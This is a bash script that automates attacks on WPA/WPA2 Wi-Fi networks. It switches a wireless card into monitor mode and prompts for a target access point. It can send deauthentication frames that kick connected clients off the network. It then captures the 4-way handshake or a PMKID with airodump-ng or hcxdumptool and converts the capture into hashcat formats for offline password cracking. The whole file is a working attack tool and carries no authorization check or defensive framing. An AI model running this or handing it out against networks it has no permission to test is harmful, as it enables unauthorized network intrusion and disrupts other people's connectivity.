#!bin/bash
# Run with root privileges.
method=${method:-"4_way_handshake_aircrack"}
mode=${headless:-0}
wn_interface=${wn_interface:-"not_specified"}
target_bssid=${target_bssid:-"not_specified"}
channel=${channel:-"not_specified"}
capture_file_name=${capture_file_name:-"not_specified"}

while [ $# -gt 0 ]; do

  if [[ $1 == *"--"* ]]; then
    param="${1/--/}"
    declare "$param"="$2"
    echo "$1" "$2"
  fi

  shift
done

if [[ $wn_interface == "not_specified" ]]; then
  iwconfig
  read -p "Type the interface: " wn_interface
fi

if [[ $capture_file_name == "not_specified" ]]; then
  current_time=$(date "+%H.%M.%S")
  capture_file_name=wpa_capture_${current_time}
fi

if [[ $method == "4_way_handshake_aircrack" ]]; then
  airmon-ng start $wn_interface

  wn_interface_monitor=${wn_interface}mon

  if [[ $target_bssid == "not_specified" ]] || [[ $channel == "not_specified" ]]; then
    if [[ $mode == 0 ]]; then
      echo "Starting airodump-ng on ${wn_interface_monitor}."

      xterm -title "airodump-ng monitor" -e airodump-ng $wn_interface_monitor &
      read -p "Type BSSID: " target_bssid

      read -p "Type channel: " channel

      killall xterm
    else
      read -p "Type BSSID: " target_bssid

      read -p "Type channel: " channel
    fi
  fi

  if [[ $mode == 0 ]]; then
    xterm -title "airodump-ng on ${target_bssid}" -e airodump-ng --bssid $target_bssid -c $channel --write $capture_file_name $wn_interface_monitor &

    echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Look on the second terminal if you see :WPA handshake: (right top coner) you are golden."
  else
    airodump-ng -K 1 --bssid $target_bssid -c $channel --write $capture_file_name $wn_interface_monitor &

    echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Typically 3-5 packets is enough. Check ${capture_file_name} if it doesn't have handshake, try again."
  fi

  continue_loop=true

  while $continue_loop; do
    read -p "To send deauth package press [Enter], to exit press [q] " user_input

    case $user_input in
    "")
      echo "Sending deauth."
      aireplay-ng --deauth 1 -a $target_bssid $wn_interface_monitor
      ;;
    "q")
      echo "Quitting..."

      if [[ $mode == 0 ]]; then
        killall xterm
      fi

      continue_loop=false
      ;;
    *)
      echo "Wrong input, use [Enter] or [q]."
      ;;
    esac
  done

  echo "Reversing ${wn_interface_monitor} back to ${wn_interface}."
  airmon-ng stop $wn_interface_monitor

  echo "Your handshake is in ${capture_file_name}.cap."
  echo "Done."

elif [[ $method == "4_way_handshake_hashcat" ]]; then
  airmon-ng start $wn_interface

  wn_interface_monitor=${wn_interface}mon

  if [[ $target_bssid == "not_specified" ]]; then
    if [[ $mode == 0 ]]; then
      echo "Starting hashcat reacon scan on ${wn_interface_monitor}."

      xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface_monitor --do_rcascan &
      read -p "Type BSSID: " target_bssid

      killall xterm
    else
      read -p "Type BSSID: " target_bssid
    fi
  fi

  systemctl stop NetworkManager.service
  sleep 2
  systemctl stop wpa_supplicant.service
  sleep 1

  echo "Forwarding choosen AP's BSSID to configuration file."
  echo $target_bssid >target_bssid.txt

  hcxdumptool -i $wn_interface_monitor -o ./dumpfile.pcapng --active_beacon --enable_status=1 --filterlist_ap=target_bssid.txt --filtermode=2

  echo "Bringing back wlan services..."
  systemctl start wpa_supplicant.service
  systemctl start NetworkManager.service
  sleep 1

  rm target_bssid.txt

  echo "Converting the traffic to hash format 22000."
  hcxpcapngtool -o ./${capture_file_name}.hc22000 ./dumpfile.pcapng

  rm dumpfile.pcapng

  echo "Your handshake is in ${capture_file_name}.hc22000."
  echo "Done."

elif [[ $method == "pmkid_hashcat" ]]; then
  airmon-ng start $wn_interface

  wn_interface_monitor=${wn_interface}mon

  if [[ $target_bssid == "not_specified" ]]; then
    if [[ $mode == 0 ]]; then
      echo "Starting hashcat reacon scan on ${wn_interface_monitor}."

      xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface_monitor --do_rcascan &
      read -p "Type BSSID: " target_bssid

      killall xterm
    else
      read -p "Type BSSID: " target_bssid

    fi
  fi

  systemctl stop NetworkManager.service
  sleep 2
  systemctl stop wpa_supplicant.service
  sleep 1

  echo "Forwarding choosen AP's BSSID to configuration file."
  echo $target_bssid >target_bssid.txt

  echo "Wait until you receive [PMKID FOUND]. This may take some."
  hcxdumptool -i $wn_interface_monitor -o ./dumpfile.pcapng --enable_status=1 --filterlist_ap=target_bssid.txt --filtermode=2

  echo "Bringing back wlan services..."
  systemctl start wpa_supplicant.service
  systemctl start NetworkManager.service
  sleep 1

  hcxpcaptool -E essidlist -I identitylist -U usernamelist -z ${capture_file_name}.hc16800 dumpfile.pcapng

  rm target_bssid.txt

  echo "Converting the capture to hash format 16800."
  hcxpcapngtool -o ./${capture_file_name}.hc16800 ./dumpfile.pcapng

  rm dumpfile.pcapng

  echo "Your PMKID is in ${capture_file_name}.hc16800."
  echo "Done."
else
  echo "Sorry."

  echo "Selected ${method} method is not recognised."
fi
